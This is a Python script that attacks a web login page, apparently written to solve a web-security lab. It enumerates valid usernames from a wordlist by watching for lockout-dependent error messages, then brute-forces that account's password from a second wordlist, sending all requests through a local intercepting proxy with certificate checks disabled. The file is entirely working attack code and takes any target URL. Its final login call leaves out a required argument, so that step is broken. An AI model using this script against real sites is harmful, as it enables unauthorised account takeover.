import os
import sys
import requests
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def findUserName(url):
    print("Enumerating The usernames: ")
    with open("usernames.txt", "r") as file:
        for username in file:
           username = username.strip()
           print('\r' + ' ' * 50, end='', flush=True)
           print(f'\rTrying {username}', end='', flush=True)
           
           if( isUserNameAccountExixst(username, url)):
               return username
     
    return ''

def isUserNameAccountExixst(username,url):
    
 
    data = {  'username':username, 'password':"t"}
    for i in range(0,4):
        responce=  requests.post(url,data=data,proxies=proxies,  verify=False).text
        if responce.find('Invalid username or password') == -1: 
            return True
    return False
def findPassword(username,url):
    
    with open("passwords.txt", "r") as file:
        for password in file:
           print('\r' + ' ' * 50, end='', flush=True)
           print(f'\rTrying {password.strip()}', end='', flush=True)
           data = {'username':username, 'password':password.strip()}
           responce = requests.post(url,data=data,proxies=proxies, verify=False).text
           if  responce.find('You have made too many incorrect login') == -1 and responce.find('Invalid username or password')==-1: 
               return password.strip()
    return ''
def login(username , password, url):
    responce = requests.post(url,data={'username':username, 'password':password},proxies=proxies, verify=False)
    return responce.status_code == 302  
        
def main():
    os.system('clear')
    if len(sys.argv) != 2:
        print(f'[Usage]: python {sys.argv[0]} <url>')
        print(f'Example: python {sys.argv[0]} www.example.com')
        sys.exit(-1)
    url = sys.argv[1]
    username = findUserName(url)
    if username == '':
        print('\nCannot find username ... ')
        sys.exit(-1)
    print(f'\nUsername => {username}')

    password = findPassword(username, url)
    if password =='':
        print("\nCan't Find PAssword")
        sys.exit(-1)
    print(f"\nPassword =>  {password}")
    time.sleep(65)
    if (login(username, password)):
        print("Successfully Login in")
    else:
        print("An error Occured")
if __name__ == "__main__":
    main()

